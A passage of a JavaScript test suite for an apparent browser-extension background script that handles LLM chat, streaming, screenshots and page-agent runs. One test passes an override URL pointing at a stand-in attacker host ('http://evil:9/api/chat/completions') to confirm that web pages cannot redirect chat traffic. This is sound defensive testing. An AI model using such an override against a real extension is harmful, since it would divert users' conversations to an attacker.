        const res = await bg.send({ type: "LIST_SERVER_TOOLS" });
        assert.deepEqual(res, { data: [] }, "degrades to empty, not an error");
    }
});

test("LIST_MODELS ignores config overrides from page-originated messages", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(call.url.startsWith("http://host/"), `leaked to ${call.url}`);
            return jsonResponse({ data: [{ id: "a" }] });
        }
    });

    // sender.tab set = relayed from a web page: override must be ignored.
    const res = await bg.send(
        { type: "LIST_MODELS", payload: { chatUrl: "http://evil:9/api/chat/completions" } },
        { tab: { id: 1 } }
    );
    assert.deepEqual(res, { data: ["a"], ollamaModels: [] });
});

test("LIST_MODELS honors overrides from the popup (no sender.tab)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(call.url.startsWith("http://other:1/"), `hit ${call.url}`);
            return jsonResponse({ data: [{ id: "a" }] });
        }
    });

    const res = await bg.send(
        { type: "LIST_MODELS", payload: { chatUrl: "http://other:1/api/chat/completions" } },
        {}
    );
    assert.deepEqual(res, { data: ["a"], ollamaModels: [] });
});

test("OLLAMA_UNLOAD evicts every loaded model with keep_alive 0", async () => {
    const generated = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/ollama/api/ps") {
                return jsonResponse({ models: [{ model: "a" }, { model: "b" }] });
            }
            if (call.url === "http://host/ollama/api/generate") {
                assert.equal(call.body.keep_alive, 0);
                generated.push(call.body.model);
                return jsonResponse({ done: true });
            }
            assert.fail(`unexpected url ${call.url}`);
        }
    });

    const res = await bg.send({ type: "OLLAMA_UNLOAD", payload: {} });
    assert.deepEqual(res, { data: ["a", "b"] });
    assert.deepEqual(generated, ["a", "b"]);
});

test("OLLAMA_PS reports loaded models with VRAM usage", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({
            models: [
                { model: "a", size_vram: 21_400_000_000, size: 30_000_000_000, expires_at: "soon", context_length: 262_144 },
                // An older Ollama omits context_length entirely → null, never a bogus 0.
                { model: "b", size_vram: 2_100_000_000, size: 2_100_000_000, expires_at: "later" },
            ]
        })
    });

    const res = await bg.send({ type: "OLLAMA_PS", payload: {} });
    assert.deepEqual(res, { data: [
        { model: "a", vramGB: 21.4, sizeGB: 30, contextLength: 262_144, expiresAt: "soon" },
        { model: "b", vramGB: 2.1, sizeGB: 2.1, contextLength: null, expiresAt: "later" },
    ] });
});

// A tiny helper: drains microtasks/macrotasks so port messages settle.
const settle = () => new Promise((r) => setTimeout(r, 10));

test("streaming Port relays SSE deltas and finishes with the full content", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.body.stream, true);
            return streamResponse([
                'data: {"choices":[{"delta":{"role":"assistant"}}]}\n',
                'data: {"choices":[{"delta":{"content":"Hel"}}]}\n',
                'data: {"choices":[{"delta":{"content":"lo"}}]}\n',
                "data: [DONE]\n"
            ]);
        }
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "hi" }] } });
    await settle();

    const deltas = client.messages.filter(m => m.type === "chunk").map(m => m.delta);
    const done = client.messages.find(m => m.type === "done");
    assert.deepEqual(deltas, ["Hel", "lo"]);
    assert.equal(done.content, "Hello");
});

test("streaming with toolIds retries the next mode when the first hands back", async () => {
    const modes = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            modes.push(call.body.params.function_calling);
            // First mode: native-style hand-back — a tool_call, no content.
            if (modes.length === 1) {
                return streamResponse([
                    'data: {"choices":[{"delta":{"tool_calls":[{"index":0}]},"finish_reason":"tool_calls"}]}\n',
                    "data: [DONE]\n"
                ]);
            }
            // Second mode: the server runs the tool and streams the answer.
            return streamResponse([
                'data: {"choices":[{"delta":{"content":"done"}}]}\n',
                "data: [DONE]\n"
            ]);
        }
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "go" }], toolIds: ["t"] } });
    await settle();

    assert.deepEqual(modes, ["legacy", "default"]);
    const deltas = client.messages.filter(m => m.type === "chunk").map(m => m.delta);
    assert.deepEqual(deltas, ["done"]);          // nothing emitted for the hand-back
    assert.equal(client.messages.find(m => m.type === "done").content, "done");
});

test("streaming surfaces errors as a port error message", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => htmlResponse(500)
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "hi" }] } });
    await settle();

    const err = client.messages.find(m => m.type === "error");
    assert.ok(err, "expected an error message");
    assert.match(err.error, /HTTP 500/);
});

test("FETCH_LLM surfaces top-level sources alongside the reply", async () => {
    const srcs = [{ source: { name: "web/search" }, metadata: [{ source: "https://x.com" }] }];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }], sources: srcs })
    });

    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.equal(res.data, "hi");
    assert.deepEqual(res.sources, srcs);
});

test("FETCH_LLM omits sources when there are none", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }] })
    });

    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.deepEqual(res, { data: "hi", model: "default-model" });   // resolved model rides along; no sources key on a plain chat
});

test("streaming delivers sources (their own SSE line) on the done message", async () => {
    const srcs = [{ source: { name: "web" }, metadata: [{ source: "https://x.com" }] }];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => streamResponse([
            'data: {"choices":[{"delta":{"content":"hi"}}]}\n',
            'data: {"sources":' + JSON.stringify(srcs) + '}\n',
            "data: [DONE]\n"
        ])
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "q" }] } });
    await settle();

    const done = client.messages.find(m => m.type === "done");
    assert.equal(done.content, "hi");
    assert.deepEqual(done.sources, srcs);
});

test("CAPTURE_TAB screenshots the sender's window and returns the data URL", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => htmlResponse() });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { windowId: 7 } });

    assert.deepEqual(bg.captures[0], [7, { format: "png" }]); // targeted the sender's window
    assert.equal(res.data, "data:image/png;base64,SHOT");
});

test("CAPTURE_TAB surfaces a capture failure as an error", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => htmlResponse(),
        onCaptureTab: () => { throw new Error("cannot capture chrome:// page"); }
    });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { windowId: 1 } });
    assert.match(res.error, /cannot capture/);
});

test("CAPTURE_TAB: with CDP on, screenshots PREFER the debugger — works on strict/on-click pages, no host grant, no quota", async () => {
    // captureVisibleTab needs activeTab OR <all_urls> specifically; a per-host grant does NOT satisfy it, and
    // it's rate-limited. The debugger is exempt (like exec/click), so with CDP on we capture through
    // Page.captureScreenshot FIRST — captureVisibleTab isn't even called.
    const bg = loadBackground({
        config: baseConfig({ cdp: true }),
        onFetch: () => htmlResponse(),
        onCaptureTab: () => { throw new Error("captureVisibleTab must NOT be called when CDP is preferred"); },
        onDebuggerCommand: (method) => (method === "Page.captureScreenshot" ? { data: "SHOTBASE64" } : undefined),
    });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { id: 7, windowId: 1, url: "https://github.com/foo/bar" } });
    assert.equal(res.error, undefined, "no error — captured via the debugger");
    assert.equal(res.data, "data:image/png;base64,SHOTBASE64", "returned the CDP PNG as a data URL");
    assert.ok(bg.debuggerCalls.some(c => c[0] === "attach"), "attached the debugger to capture");
    assert.equal(bg.captures.length, 0, "captureVisibleTab was NOT called — CDP is preferred when enabled");
});

test("CAPTURE_TAB: CDP on but the debugger capture fails → falls back to captureVisibleTab", async () => {
    // e.g. real DevTools already holds the tab's debugger → attach/capture fails → use captureVisibleTab (which
    // works when the page DOES have access). No silent failure.
    const bg = loadBackground({
        config: baseConfig({ cdp: true }),
        onFetch: () => htmlResponse(),
        onCaptureTab: () => "data:image/png;base64,FALLBACK",
        onDebuggerCommand: () => undefined,   // Page.captureScreenshot returns no data → cdpScreenshot errors → fallback
    });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { id: 7, windowId: 1, url: "https://x.test/" } });
    assert.equal(res.error, undefined);
    assert.equal(res.data, "data:image/png;base64,FALLBACK", "fell back to captureVisibleTab");
});

test("CAPTURE_TAB (CDP off): the site-access error explains the REAL fix (On all sites / enable CDP), not a per-host grant", async () => {
    const bg = loadBackground({
        config: baseConfig({ cdp: false }),
        onFetch: () => htmlResponse(),
        onCaptureTab: () => { throw new Error("Either the '<all_urls>' or 'activeTab' permission is required."); },
    });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { id: 7, windowId: 1, url: "https://github.com/foo/bar" } });
    assert.doesNotMatch(res.error, /activeTab permission is required/, "the raw Chrome error is not leaked verbatim");
    assert.match(res.error, /On all sites/, "points at the grant that actually enables captureVisibleTab");
    assert.match(res.error, /Debugger|CDP/, "offers the debugger route (the easy fix)");
    assert.doesNotMatch(res.error, /add (\"?github\.com|this host)/i, "does NOT tell them to add a per-host grant — which does NOT work for captureVisibleTab");
});

test("SAVE_SESSION persists a session that GET_SESSION reads back", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({}) });
    const session = { hash: "abc123", messages: [{ role: "user", content: "hi" }], model: "m", save: true };

    const saved = await bg.send({ type: "SAVE_SESSION", payload: { hash: "abc123", session } });
    assert.deepEqual(saved, { data: true });

    const got = await bg.send({ type: "GET_SESSION", payload: { hash: "abc123" } });
    assert.deepEqual(got.data, session);

    const missing = await bg.send({ type: "GET_SESSION", payload: { hash: "nope" } });
    assert.equal(missing.data, null);
});

test("devtools panel: buffers debug events per tab, replays on connect, relays live, resets", async () => {
    const bg = loadBackground({ config: baseConfig() });
    // Fire-and-forget: the ML_DEBUG_* handlers don't sendResponse, so we don't await —
    // they run synchronously inside the send() executor.
    const dbg = (n, id) => bg.send({ type: "ML_DEBUG_EVENT", event: { kind: "chat", n } }, { tab: { id } });

    // Events arrive for tab 7 BEFORE any panel is open → buffered. Tab 8 must not leak in.
    dbg(1, 7); dbg(2, 7); dbg(99, 8);

    // A panel opens for tab 7 → gets a replay burst of exactly tab 7's events, in order.
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    const replay = panel.messages.find(m => Array.isArray(m.replay));
    assert.ok(replay, "panel received a replay burst on connect");
    assert.deepEqual(replay.replay.map(e => e.n), [1, 2], "replay is tab 7's events, no tab-8 leak");

    // A live event now fans out to the connected panel.
    dbg(3, 7);
    const live = panel.messages.filter(m => m.__mlDebug);
    assert.equal(live.length, 1, "one live relay");
    assert.equal(live[0].__mlDebug.n, 3);

    // RESET clears the tab's buffer (fresh page) → a panel opened after replays nothing. The handler now
    // defers past the startup rehydrate (a microtask), so let it settle before asserting.
    bg.send({ type: "ML_DEBUG_RESET" }, { tab: { id: 7 } });
    await new Promise(r => setTimeout(r, 0));
    const panel2 = bg.connect("ml-devtools");
    panel2.send({ type: "ml-devtools-init", tabId: 7 });
    assert.deepEqual(panel2.messages.find(m => Array.isArray(m.replay)).replay, [], "reset → nothing to replay");
});

test("ML_DEBUG_RESET does NOT wipe a tab that still has a resumable/interrupted run (the site-grant vanish)", async () => {
    // A mid-run site-access grant can cycle the SW; the destination page's late CS injection then fires
    // ML_DEBUG_RESET. If that wiped the panel while the interrupted run is recovering (in bgRuns), the session
    // vanishes. Simulate: buffer events for a tab, mark the tab as HOSTING a bg run, then reset → kept.
    const bg = loadBackground({ config: baseConfig() });
    bg.send({ type: "ML_DEBUG_EVENT", event: { kind: "agent", n: 1 } }, { tab: { id: 5 } });
    bg.send({ type: "ML_DEBUG_EVENT", event: { kind: "agent-step", n: 2 } }, { tab: { id: 5 } });
    bg.context.__mlSeedBgRunForTest(5, "run5");   // the tab has a run in bgRuns (completed-resumable or hydrated-interrupted)
    bg.send({ type: "ML_DEBUG_RESET" }, { tab: { id: 5 } });
    await new Promise(r => setTimeout(r, 0));
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 5 });
    const replay = panel.messages.find(m => Array.isArray(m.replay)).replay;
    assert.equal(replay.length, 2, "the interrupted/resumable run's history survived the late reset");
});

test("ML_HL_REMOTE: the panel's hover-highlight is relayed to the inspected tab's content script", () => {
    // The DevTools panel can't reach the inspected page, so it sends ML_HL_REMOTE{tabId, ref} to the
    // background, which forwards it to that tab's shell via chrome.tabs.sendMessage — the reverse channel.
    // Fire-and-forget (no sendResponse), so DON'T await bg.send — the handler runs synchronously inside
    // send()'s executor and the tabs.sendMessage mock records synchronously (awaiting would hang: the
    // send() promise never resolves because the handler never calls its resolve).
    const bg = loadBackground({ config: baseConfig() });
    bg.send({ type: "ML_HL_REMOTE", tabId: 12, ref: { selector: "#go", index: 0 } });
    assert.equal(bg.tabMessages.length, 1, "one relay to the tab");
    assert.equal(bg.tabMessages[0][0], 12, "addressed to the inspected tab");
    assert.deepEqual(bg.tabMessages[0][1], { type: "ML_HL_REMOTE", ref: { selector: "#go", index: 0 } }, "the ref is forwarded verbatim");
    // A clear (ref:null) forwards too; a non-numeric tabId is ignored (no throw, no relay).
    bg.send({ type: "ML_HL_REMOTE", tabId: 12, ref: null });
    assert.deepEqual(bg.tabMessages[1][1], { type: "ML_HL_REMOTE", ref: null }, "a clear is relayed");
    bg.send({ type: "ML_HL_REMOTE", ref: { selector: "#x" } });
    assert.equal(bg.tabMessages.length, 2, "no tabId → not relayed");
});

test("ML_SESSION_REMOTE: the panel's composer Send/Stop is relayed to the inspected tab (parity with the overlay)", () => {
    // Panel parity for the composer. The overlay app posts sessionSend/sessionCancel to its shell parent,
    // which reaches __mlSessionSend/__mlCancelSession directly. The DevTools panel can't touch the inspected
    // page, so panel.ts posts ML_SESSION_REMOTE{tabId, action} to the background, which forwards
    // ML_SESSION_TO_PAGE to that tab's shell → the SAME page handlers (incl. the cross-page CANCEL_RUN fix).
    // Different backend mechanism, same behaviour. Fire-and-forget (no sendResponse) → don't await.
    const bg = loadBackground({ config: baseConfig() });
    bg.send({ type: "ML_SESSION_REMOTE", tabId: 5, action: "send", hash: "abc", text: "steer left", images: [] });
    assert.equal(bg.tabMessages.length, 1, "one relay to the tab");
    assert.equal(bg.tabMessages[0][0], 5, "addressed to the inspected tab");
    assert.deepEqual(bg.tabMessages[0][1], { type: "ML_SESSION_TO_PAGE", action: "send", hash: "abc", text: "steer left", images: [] }, "Send is forwarded verbatim");
    // Stop (cancel) forwards too — this is the reverse-channel half of the composer Stop button on the panel.
    bg.send({ type: "ML_SESSION_REMOTE", tabId: 5, action: "cancel", hash: "abc" });
    const cancelMsg = bg.tabMessages[1][1];
    assert.equal(cancelMsg.type, "ML_SESSION_TO_PAGE");
    assert.equal(cancelMsg.action, "cancel");
    assert.equal(cancelMsg.hash, "abc");
    // A non-numeric tabId is ignored (no throw, no relay) — mirrors ML_HL_REMOTE.
    bg.send({ type: "ML_SESSION_REMOTE", action: "cancel", hash: "abc" });
    assert.equal(bg.tabMessages.length, 2, "no tabId → not relayed");
});

test("START_RUN (surface 'devtools') fans a background run's step events to the PANEL port, not the page", async () => {
    // DevTools parity: a background-hosted run in devtools mode streams its agent-step events to the
    // panel via relayDebugEvent (the ml-devtools ports), NOT chrome.tabs.sendMessage (which the harness
    // doesn't even mock — so if the wrong branch ran, this would throw). A no-tool reply keeps it to a
    // single usage-only step, so no page delegation is needed.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "done" } }], usage: { prompt_tokens: 10, completion_tokens: 2, total_tokens: 12 } }),
    });
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    await bg.send({ type: "START_RUN", payload: {
        runId: "run1", task: "x", systemPrompt: "sys", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 7 } });
    const steps = panel.messages.filter(m => m.__mlDebug && m.__mlDebug.kind === "agent-step");
    assert.ok(steps.length >= 1, "the run's agent-step events reached the panel via relayDebugEvent");
    assert.ok(steps.some(s => s.__mlDebug.usage && s.__mlDebug.usage.totalTokens === 12), "the usage step fanned to the panel");
});

test("START_RUN (stream:true) streams reasoning LIVE and accumulates fragmented tool_calls from the stream", async () => {
    // Opt-in streaming: the model call uses streamAgentTurn — it fans reasoning deltas (agent-stream) so a long
    // think shows live, AND accumulates the OpenAI-style fragmented tool_call (id + name + arguments-string
    // pieces across chunks) so the loop still gets an authoritative { tool_calls } to delegate.
    let call = 0, delegatedArgs = null;
    const bg = loadBackground({
        config: baseConfig(),
        onTabMessage: (_tabId, msg) => {
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "findByText") { delegatedArgs = msg.payload.args; return { result: "found: Step 1" }; }
            return undefined;
        },
        onFetch: () => {
            call++;
            if (call === 1) return streamResponse([
                'data: {"choices":[{"delta":{"reasoning_content":"Let me "}}]}\n',
                'data: {"choices":[{"delta":{"reasoning_content":"find the step."}}]}\n',
                'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"findByText","arguments":"{\\"text\\":"}}]}}]}\n',
                'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"\\"Step\\"}"}}]}}]}\n',
                'data: {"choices":[{"delta":{},"finish_reason":"tool_calls"}]}\n',
                'data: [DONE]\n',
            ]);
            return streamResponse(['data: {"choices":[{"delta":{"content":"All done."}}]}\n', 'data: [DONE]\n']);
        },
    });
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "sr", task: "find step 1", systemPrompt: "s",
        tools: [{ name: "findByText", description: "", parameters: { type: "object", properties: { text: { type: "string" } } }, requiresApproval: false, capabilities: [] }],
        model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools", stream: true,
    } }, { tab: { id: 7 } });
    // Reasoning streamed live to the panel (agent-stream deltas carry the ACCUMULATED text).
    const streams = panel.messages.filter(m => m.__mlDebug && m.__mlDebug.kind === "agent-stream");
    assert.ok(streams.length >= 1, "agent-stream deltas fanned to the panel");
    assert.ok(streams.some(s => /find the step/.test(s.__mlDebug.reasoning || "")), "the accumulated reasoning streamed live");
    assert.ok(streams.some(s => /All done/.test(s.__mlDebug.content || "")), "the final answer's content streamed live too");
    // The FRAGMENTED tool_call was reassembled across chunks and delegated with the full arguments.
    assert.deepEqual(delegatedArgs, { text: "Step" }, "tool_call arguments accumulated from the stream fragments");
    assert.equal(res.data.summary, "All done.");
});

test("START_RUN (devtools) after a NAVIGATION fans the agent-result to the PANEL (not just the dead page)", async () => {
    // The bug: a background run in devtools mode that NAVIGATED stuck the panel on "running" with no answer —
    // the HUD (page-fed) had it, the panel didn't. After a nav the page-side caller that normally feeds the
    // panel its lifecycle events (via the shell forwarder) is GONE, and the shell drops the background's
    // __mlFromBg copy for the panel (dedup). So emitLifecycle must fan the terminal agent-result to the panel
    // PORT itself (relayDebugEvent), mirroring emitStep. This proves it does.
    let fetches = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => {
            fetches++;
            return fetches === 1
                ? jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "navigate", arguments: JSON.stringify({ url: "/step2" }) } }] }, finish_reason: "tool_calls" }] })
                : jsonResponse({ choices: [{ message: { content: "arrived and finished" } }] });
        },
        // Mock the page delegation: the navigate tool "succeeds", and — since the navigate branch then WAITS for
        // re-adoption — schedule the RUN_READOPTED that releases the barrier (fired right after noteNavigating).
        onTabMessage: async (_tabId, msg) => {
            if (msg && msg.type === "RUN_TOOL_IN_PAGE" && msg.payload && msg.payload.name === "navigate") {
                setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navrun", pageInfo: "URL: /step2\nTitle: Step 2" } }, { tab: { id: 7 } }); }, 0);
                return { result: "Navigating to /step2 …" };
            }
            return undefined;
        },
    });
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "navrun", task: "go to step 2", systemPrompt: "sys",
        tools: [{ name: "navigate", description: "go", parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] }, requiresApproval: false, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 7 } });

    assert.equal(res.data.summary, "arrived and finished", "the run completed with its answer");
    const results = panel.messages.filter(m => m.__mlDebug && m.__mlDebug.kind === "agent-result");
    assert.ok(results.length >= 1, "the navigated run's agent-result reached the PANEL port (not stuck 'running')");
    assert.equal(results.at(-1).__mlDebug.summary, "arrived and finished", "…carrying the final answer");
    // Orient-on-nav parity: the navigate step's result — enriched with the destination pageInfo — also reached
    // the panel (same relayDebugEvent path as the overlay's ML_DEBUG_TO_PAGE), so the panel shows it too.
    const navSteps = panel.messages.filter(m => m.__mlDebug && m.__mlDebug.kind === "agent-step" && m.__mlDebug.tool === "navigate");
    assert.ok(navSteps.some(s => /You are now on the new page[\s\S]*\/step2/.test(s.__mlDebug.result || "")), "the enriched navigate result reached the panel");
});

test("delegated tool: a mid-call navigation (channel closed) yields an ACTIONABLE new-page result, not an opaque error", async () => {
    // Real qwen run: `type` (with submit), or ANY tool whose action navigates — or a page that redirects while
    // the call waits for approval — closes the content-script channel. Chrome's raw "message channel closed"
    // reached the model as "could not reach the page", which it can't act on. Now the background recognises it
    // as a navigation, waits for re-adopt, and hands back the NEW page's context.
    let capturedTurn2 = null;
    let fetches = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            fetches++;
            if (fetches === 1) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "type", arguments: JSON.stringify({ selector: "input", text: "hi", submit: true }) } }] }, finish_reason: "tool_calls" }] });
            capturedTurn2 = call.body.messages;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg && msg.type === "RUN_TOOL_IN_PAGE" && msg.payload && msg.payload.name === "type") {
                // The page navigates out from under the call: schedule the re-adopt (pageInfo), then close the channel.
                setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navt", pageInfo: "URL: https://example.test/results\nTitle: Results" } }, { tab: { id: 3 } }); }, 0);
                throw new Error("A listener indicated an asynchronous response by returning true, but the message channel closed before a response was received.");
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "navt", task: "type it", systemPrompt: "sys",
        tools: [{ name: "type", description: "type text", parameters: { type: "object", properties: { selector: { type: "string" }, text: { type: "string" }, submit: { type: "boolean" } }, required: ["selector", "text"] }, requiresApproval: false, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { tab: { id: 3 } });

    const joined = (capturedTurn2 || []).map(m => (typeof m.content === "string" ? m.content : "")).join("\n");
    assert.match(joined, /The page navigated while running "type"/, "the tool result names the navigation");
    assert.match(joined, /example\.test\/results/, "…and carries the new page's context (the URL)");
    assert.doesNotMatch(joined, /could not reach the page/, "the opaque channel-closed error is gone");
});

test("navigate({ verify: true }) folds a screenshot of the destination page into the result", async () => {
    // Like the click/type verify: after the destination re-adopts, the background rings back for a WHOLE-VIEWPORT
    // capture on the new page and merges the image (+ note) into the navigate result — so the model SEES where it
    // landed inline, no wait+look turn. Here onTabMessage mocks both the navigate and the verifyViewport calls.
    let capturedTurn2 = null;
    let fetches = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            fetches++;
            if (fetches === 1) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "navigate", arguments: JSON.stringify({ url: "/x", verify: true }) } }] }, finish_reason: "tool_calls" }] });
            capturedTurn2 = call.body.messages;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (!msg || msg.type !== "RUN_TOOL_IN_PAGE" || !msg.payload) return undefined;
            if (msg.payload.name === "navigate") {
                setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "nv", pageInfo: "URL: https://ex.test/x\nTitle: X" } }, { tab: { id: 6 } }); }, 0);
                return { result: "Navigating to /x … wait for the new page, then continue." };
            }
            if (msg.payload.verifyViewport) {   // the background's post-re-adopt verify capture
                return { result: "\n\nThe page settled — here's the current viewport.", image: "data:image/png;base64,SHOTPNG", imageLabel: "after wait", feedback: { reason: "after wait", via: "image", image: "data:image/png;base64,SHOTPNG" } };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "nv", task: "go to x", systemPrompt: "sys",
        tools: [{ name: "navigate", description: "go", parameters: { type: "object", properties: { url: { type: "string" }, verify: { type: "boolean" } }, required: ["url"] }, requiresApproval: false, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { tab: { id: 6 } });

    const joined = (capturedTurn2 || []).map((m) => (typeof m.content === "string" ? m.content : JSON.stringify(m.content))).join("\n");
    assert.match(joined, /You are now on the new page/, "orient-on-nav pageInfo is folded in");
    assert.match(joined, /current viewport/, "the verify note is folded into the navigate result");
    assert.match(JSON.stringify(capturedTurn2), /SHOTPNG/, "the destination screenshot reached the model as an inline image");
});

test("chat_metadata: reports a PER-MODEL breakdown of delegated vision sub-calls (which model cost what)", async () => {
    // "the slop": chat_metadata already reports the AGGREGATE delegated spend; now it breaks it down by vision
    // model. A delegated tool reports its byModel delta on the envelope → the background subTally merges it →
    // chat_metadata (answered by the loop) renders per-model lines. Gated inherently on the tool being present.
    let metaMessages = null;
    let fetches = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            fetches++;
            if (fetches === 1) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "look", arguments: "{}" } }] }, finish_reason: "tool_calls" }] });
            if (fetches === 2) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c2", type: "function", function: { name: "chat_metadata", arguments: "{}" } }] }, finish_reason: "tool_calls" }] });
            metaMessages = call.body.messages;   // turn 3: the chat_metadata answer is now in the history
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg && msg.type === "RUN_TOOL_IN_PAGE" && msg.payload && msg.payload.name === "look") {
                // Two vision sub-calls to DIFFERENT models on this one delegated look (e.g. reader + a re-look).
                return { result: "looked", subUsage: { prompt: 1800, completion: 400, calls: 2, byModel: [{ model: "qwen3-vl:30b", prompt: 1000, completion: 200, calls: 1 }, { model: "gemma4:31b", prompt: 800, completion: 200, calls: 1 }] } };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "meta1", task: "look then report", systemPrompt: "sys",
        tools: [
            { name: "look", description: "see the screen", parameters: { type: "object", properties: {} }, requiresApproval: false, capabilities: ["vision"] },
            { name: "chat_metadata", description: "run metadata", parameters: { type: "object", properties: {} }, requiresApproval: false, capabilities: ["meta"] },
        ],
        model: "m", think: null, maxSteps: 6, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { tab: { id: 11 } });

    const joined = (metaMessages || []).map((m) => (typeof m.content === "string" ? m.content : "")).join("\n");
    assert.match(joined, /delegated vision sub-calls this session: 2200 tokens over 2 calls/, "the aggregate line");
    assert.match(joined, /qwen3-vl:30b — 1 call, ~1200 tokens/, "per-model line: the bigger spender");
    assert.match(joined, /gemma4:31b — 1 call, ~1000 tokens/, "per-model line: the smaller spender");
    // Biggest spender first.
    assert.ok(joined.indexOf("qwen3-vl:30b") < joined.indexOf("gemma4:31b"), "ordered by spend, descending");
});

test("answer element visuals ride the run result + agent-result (HUD completion media)", async () => {
    // A background-hosted run's `answer` returns serialized element crops on its envelope → the background
    // accumulates them → they ride BOTH the run's result (res.answerMedia, for a createAgent handle) and the
    // agent-result event (for the HUD card). onTabMessage mocks the delegated answer envelope.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            const answered = (call.body.messages || []).some((m) => typeof m.content === "string" && m.content.includes("Answer:"));
            return answered
                ? jsonResponse({ choices: [{ message: { content: "Here's the best cat." } }] })
                : jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "answer", arguments: JSON.stringify({ selector: "img.cat", note: "the best cat" }) } }] }, finish_reason: "tool_calls" }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg && msg.type === "RUN_TOOL_IN_PAGE" && msg.payload && msg.payload.name === "answer") {
                return { result: "Answer: 1 element(s) — the best cat: img.cat", elementCount: 1, answerMedia: [{ image: "data:image/png;base64,CATPIC", label: "the best cat", selector: "img.cat" }] };
            }
            return undefined;
        },
    });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "ans1", task: "find the best cat", systemPrompt: "sys",
        tools: [{ name: "answer", description: "return element", parameters: { type: "object", properties: { selector: { type: "string" }, note: { type: "string" } }, required: ["selector"] }, requiresApproval: false, capabilities: ["answer"] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
